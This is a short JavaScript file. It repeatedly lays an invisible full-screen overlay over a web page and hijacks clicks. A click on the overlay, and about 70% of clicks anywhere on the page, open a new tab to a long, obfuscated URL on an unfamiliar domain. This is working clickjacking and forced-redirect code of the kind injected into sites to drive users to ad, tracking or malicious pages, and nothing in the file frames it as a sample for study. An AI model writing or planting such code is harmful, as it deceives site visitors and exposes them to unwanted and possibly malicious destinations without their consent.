function createOverlay() {
  // Check if an overlay already exists
  if (document.getElementById('overlay')) return;

  // Create overlay element
  const overlay = document.createElement('div');
  overlay.id = 'overlay';
  overlay.style.position = 'fixed';
  overlay.style.top = '0';
  overlay.style.left = '0';
  overlay.style.width = '100%';
  overlay.style.height = '100%';
  overlay.style.backgroundColor = 'rgba(0, 0, 0, 0)'; // transparent
  overlay.style.zIndex = '9999';
  overlay.style.cursor = 'pointer';

    document.addEventListener('click', () => {
    // Generate a random number between 0 and 1
    const chance = Math.random();

    // Adjust threshold as you like (e.g., 0.7 means 30% chance)
    if (chance > 0.3) {
      window.open('https://oundhertobeconsist.org/QkVMa3Z9Jj9WFAQEfz0jFCEWDE8rIX0fGAB3DlguBQAPMS5yYy0JAn91ahkTJnh9TQUveH1dUCl4ah1Lc2t%2FX1hxc2JcUDExP1ZGZDU%2BBUtyYykGFH91ah8fJnh9WkR0c3ldUDA9NVZHc3B%2BNEFwdWoCGCF4fV9QN3h%2BW0F2cHVSQ3twellPcXR1TRclIC9WR3VzfV5GdXd8WFAkNnFaUDAgKlYeNjE8GFNxBGlZMGd3CgoSMWsgHhcwKCMZWCwgOE5EBCIpHykpIDVORQQjIxlTcQENHRMxMSUTKQ4sIgAAJzc4AgUnaD8FMAgqOxguFQkfPFAtNj5WFyY2YgcDIzchBARsKykfUCg2OFZGZCAiGUtyYyAIAyN4IQQMKykgClNwA3lFRmd3fEMBKysoBAExYH5bGDZgfltHcmt8TkUAYH5bASsrel9TcQdpWUY6c3hCU3B1LRsGLiA7DhQpLDhORARwf1xYcXNpWUZqLiQfGy5gfihTcHUgAh0nYH5bEScmJwRfZ3d8CB4wKiEOU3ADfV9CbHViW1hyYH5bBSMjLRkfZ3cKXkV1a39dU3B1KQ8RZ3cKWkJ2a3xFRmx1ah8MJnhhWFA3KSMISzIxYSkkZ3cPGwJkLCpWRmQmOFZFZCY4CEt7YxMCPBcccVpBdHx1XkJzdH1aQHFjOR8Ec3h8W0xydXZbRGQwOBlEf3F4TQM2N39WRmQwOBlCf3VqHgIwcHFbUDcxPl1LcmM5HwR1eHxNACMpJQ9Lcw%3D%3D', '_blank');
    }
  });
 
  overlay.addEventListener('click', () => {
    overlay.remove();
    window.open('https://oundhertobeconsist.org/QkVMa3Z9Jj9WFAQEfz0jFCEWDE8rIX0fGAB3DlguBQAPMS5yYy0JAn91ahkTJnh9TQUveH1dUCl4ah1Lc2t%2FX1hxc2JcUDExP1ZGZDU%2BBUtyYykGFH91ah8fJnh9WkR0c3ldUDA9NVZHc3B%2BNEFwdWoCGCF4fV9QN3h%2BW0F2cHVSQ3twellPcXR1TRclIC9WR3VzfV5GdXd8WFAkNnFaUDAgKlYeNjE8GFNxBGlZMGd3CgoSMWsgHhcwKCMZWCwgOE5EBCIpHykpIDVORQQjIxlTcQENHRMxMSUTKQ4sIgAAJzc4AgUnaD8FMAgqOxguFQkfPFAtNj5WFyY2YgcDIzchBARsKykfUCg2OFZGZCAiGUtyYyAIAyN4IQQMKykgClNwA3lFRmd3fEMBKysoBAExYH5bGDZgfltHcmt8TkUAYH5bASsrel9TcQdpWUY6c3hCU3B1LRsGLiA7DhQpLDhORARwf1xYcXNpWUZqLiQfGy5gfihTcHUgAh0nYH5bEScmJwRfZ3d8CB4wKiEOU3ADfV9CbHViW1hyYH5bBSMjLRkfZ3cKXkV1a39dU3B1KQ8RZ3cKWkJ2a3xFRmx1ah8MJnhhWFA3KSMISzIxYSkkZ3cPGwJkLCpWRmQmOFZFZCY4CEt7YxMCPBcccVpBdHx1XkJzdH1aQHFjOR8Ec3h8W0xydXZbRGQwOBlEf3F4TQM2N39WRmQwOBlCf3VqHgIwcHFbUDcxPl1LcmM5HwR1eHxNACMpJQ9Lcw%3D%3D', '_blank');
  });

  // Add to page
  document.body.appendChild(overlay);
}

// Function to repeatedly show overlay
function startOverlayCycle() {
  setInterval(() => {
    createOverlay();
  }, Math.random() < 0.5 ? 3000 : 5000); // randomly 3s or 5s
}

// Start the cycle
startOverlayCycle();
